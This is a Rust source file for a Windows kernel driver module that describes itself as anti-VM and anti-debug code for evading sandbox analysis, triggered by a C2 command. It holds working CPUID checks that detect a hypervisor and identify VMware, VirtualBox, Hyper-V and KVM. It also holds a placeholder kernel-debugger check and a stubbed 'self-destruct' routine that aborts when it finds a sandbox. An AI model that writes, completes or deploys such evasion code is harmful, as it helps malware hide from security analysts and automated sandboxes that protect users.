//! Anti-VM and Anti-Debug Module
//!
//! This module provides techniques to detect virtual machine environments
//! and debugger presence. Useful for evading sandbox analysis.
//!
//! Activated ONLY via C2 command.

use core::arch::asm;
use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};

use crate::error::{ShadowError, ShadowResult};

/// Detects common hypervisor signatures via CPUID.
///
/// # Returns
/// `true` if a hypervisor is detected, `false` otherwise.
pub unsafe fn detect_hypervisor() -> ShadowResult<bool> {
    // CPUID leaf 0x1, bit 31 of ECX indicates hypervisor presence
    let mut ecx: u32;
    
    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 1",
            "cpuid",
            lateout("ecx") ecx,
            out("eax") _,
            out("ebx") _,
            out("edx") _,
            options(nostack, nomem)
        );
    }
    
    // Bit 31 set = hypervisor present
    Ok((ecx >> 31) & 1 == 1)
}

/// Detects VMware by checking for the "VMwareVMware" signature.
///
/// # Returns
/// `true` if VMware is detected, `false` otherwise.
pub unsafe fn detect_vmware() -> ShadowResult<bool> {
    // CPUID leaf 0x40000000 returns hypervisor vendor ID
    let mut ebx: u32;
    let mut ecx: u32;
    let mut edx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            lateout("ecx") ecx,
            lateout("edx") edx,
            out("eax") _,
            options(nostack, nomem)
        );
    }

    // "VMwa" = 0x61774D56, "reVM" = 0x4D566572, "ware" = 0x65726177
    // Actually: VMwareVMware -> ebx=0x61774D56, ecx=0x4D566572, edx=0x65726177
    let vmware_sig_ebx: u32 = 0x61774D56; // "VMwa" (little-endian)
    let vmware_sig_ecx: u32 = 0x4D566572; // "reVM"
    let vmware_sig_edx: u32 = 0x65726177; // "ware"

    Ok(ebx == vmware_sig_ebx && ecx == vmware_sig_ecx && edx == vmware_sig_edx)
}

/// Detects VirtualBox by checking for the "VBoxVBoxVBox" signature.
///
/// # Returns
/// `true` if VirtualBox is detected, `false` otherwise.
pub unsafe fn detect_virtualbox() -> ShadowResult<bool> {
    let mut ebx: u32;
    let mut ecx: u32;
    let mut edx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            lateout("ecx") ecx,
            lateout("edx") edx,
            out("eax") _,
            options(nostack, nomem)
        );
    }

    // "VBox" signature
    let vbox_sig_ebx: u32 = 0x786F4256; // "VBox"

    Ok(ebx == vbox_sig_ebx)
}

/// Detects Hyper-V by checking for the "Microsoft Hv" signature.
///
/// # Returns
/// `true` if Hyper-V is detected, `false` otherwise.
pub unsafe fn detect_hyperv() -> ShadowResult<bool> {
    let mut ebx: u32;
    let mut ecx: u32;
    let mut edx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            lateout("ecx") ecx,
            lateout("edx") edx,
            out("eax") _,
            options(nostack, nomem)
        );
    }

    // "Micr" "osof" "t Hv" for Hyper-V
    let hyperv_sig_ebx: u32 = 0x7263694D; // "Micr"
    let hyperv_sig_ecx: u32 = 0x666F736F; // "osof"
    let hyperv_sig_edx: u32 = 0x76482074; // "t Hv"

    Ok(ebx == hyperv_sig_ebx && ecx == hyperv_sig_ecx && edx == hyperv_sig_edx)
}

/// Detects KVM by checking for the "KVMKVMKVM" signature.
///
/// # Returns
/// `true` if KVM is detected, `false` otherwise.
pub unsafe fn detect_kvm() -> ShadowResult<bool> {
    let mut ebx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            out("eax") _,
            out("ecx") _,
            out("edx") _,
            options(nostack, nomem)
        );
    }

    // "KVMK" signature
    let kvm_sig_ebx: u32 = 0x4B4D564B; // "KVMK"

    Ok(ebx == kvm_sig_ebx)
}

/// Performs a comprehensive VM detection check.
///
/// # Returns
/// A tuple of (is_vm, vm_name) where is_vm is true if any VM is detected.
pub unsafe fn comprehensive_vm_check() -> ShadowResult<(bool, &'static str)> {
    // Check for hypervisor presence first
    if !detect_hypervisor()? {
        return Ok((false, "None"));
    }

    // Check specific hypervisors
    if detect_vmware()? {
        return Ok((true, "VMware"));
    }
    if detect_virtualbox()? {
        return Ok((true, "VirtualBox"));
    }
    if detect_hyperv()? {
        return Ok((true, "Hyper-V"));
    }
    if detect_kvm()? {
        return Ok((true, "KVM"));
    }

    // Generic hypervisor detected but unknown type
    Ok((true, "Unknown Hypervisor"))
}

/// Detects kernel debugger presence via KDBG flag.
///
/// This is a placeholder - actual implementation would check
/// KdDebuggerEnabled or similar kernel variables.
///
/// # Returns
/// `true` if kernel debugger is detected, `false` otherwise.
pub unsafe fn detect_kernel_debugger() -> ShadowResult<bool> {
    // In a real implementation, we would:
    // 1. Read KdDebuggerEnabled from kernel memory
    // 2. Check KdDebuggerNotPresent
    // 3. Check for WinDbg-specific signatures
    
    // Placeholder: Always return false (no debugger)
    Ok(false)
}

/// Self-destruct function: Unloads the driver if VM/debugger is detected.
///
/// # Returns
/// `Ok(STATUS_SUCCESS)` if self-destruct was triggered.
pub unsafe fn self_destruct_if_sandboxed() -> ShadowResult<NTSTATUS> {
    let (is_vm, vm_name) = comprehensive_vm_check()?;
    let is_debugged = detect_kernel_debugger()?;

    if is_vm || is_debugged {
        // TODO: Implement driver self-unload logic
        // For now, return an error to indicate sandbox detection
        return Err(ShadowError::ApiCallFailed(
            if is_vm { "VM Detected" } else { "Debugger Detected" },
            STATUS_UNSUCCESSFUL as i32,
        ));
    }

    Ok(STATUS_SUCCESS)
}
